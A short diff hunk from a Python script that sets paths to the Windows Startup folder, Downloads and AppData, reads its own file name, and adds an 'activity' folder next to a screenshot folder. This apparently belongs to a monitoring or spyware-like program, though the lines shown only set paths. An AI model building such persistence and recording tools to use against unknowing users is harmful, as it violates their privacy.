@@ -6,6 +6,9 @@ directory = os.path.expanduser('~')
 startup_folder = os.path.join(directory, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 download_folder = os.path.join(directory, "Downloads")
 user_folder = os.path.join(directory, "AppData", "Roaming")
+directory = os.path.join(directory, 'activity')
+if not os.path.exists(directory):
+    os.makedirs(directory)
 win_main = "win_main"
 file_name = os.path.splitext(sys.argv[0].split("\\")[-1])[0]
 ss_folder = 'ss'
